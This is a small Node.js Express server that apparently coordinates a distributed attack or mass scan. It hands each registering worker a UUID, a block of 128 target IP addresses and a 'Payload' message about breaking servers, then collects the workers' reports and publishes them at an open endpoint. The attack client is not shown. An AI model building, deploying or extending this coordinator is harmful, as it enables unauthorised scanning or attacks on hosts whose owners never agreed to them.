const express = require('express');
const { v4 } = require('uuid');
const IPCIDR = require('ip-cidr');
const storage = require('./storage');

const app = express();
const reports = {};

app.use(express.json());
app.use(express.static('public/'));

app.get('/xhr', (_, res) => {
  res.json(reports);
});

app.post('/update/:uuid', (req, res) => {
  reports[req.params.uuid] = req.body;
  res.sendStatus(200);
});

app.post('/register', async (_, res) => {
  const newUUID = v4();
  const newTargets = [];
  for (let i = 0; i < 128; i++) {
    newTargets.push(storage.getNextIp());
  }
  await storage.setValue(newUUID, newTargets);
  console.log('register: assigned', newTargets[0], '-', newTargets[newTargets.length-1], 'to', newUUID);
  res.json({
    UUID: newUUID,
    IPs: newTargets,
    Payload: "I broke my heart, it's time i broke some servers too :)",
    Timeout: 1000,
  });
});

storage.init().then(() => {
  app.listen(process.env.NODE_PORT || 80, () => {
    console.log('init: done');
  });
});